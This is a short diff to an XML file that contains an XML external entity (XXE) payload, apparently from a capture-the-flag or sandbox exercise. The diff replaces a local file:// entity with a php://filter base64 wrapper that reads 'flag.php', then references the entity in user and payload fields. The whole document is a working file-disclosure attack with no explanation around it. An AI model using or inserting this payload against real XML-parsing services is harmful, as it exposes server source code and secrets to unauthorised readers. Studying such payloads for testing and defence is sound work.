@@ -1,8 +1,11 @@
 <!--?xml version="1.0" ?-->
 <!DOCTYPE foo[
-<!ENTITY xxe SYSTEM "file:///d:/xampp/htdocs/sandbox/xxe.php">
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">
 ]>
 <userInfo>
 <firstName>John</firstName>
 <lastName>&xxe;</lastName>
 </userInfo>
+<payload>
+    <toptext>&xxe;</toptext>
+</payload>
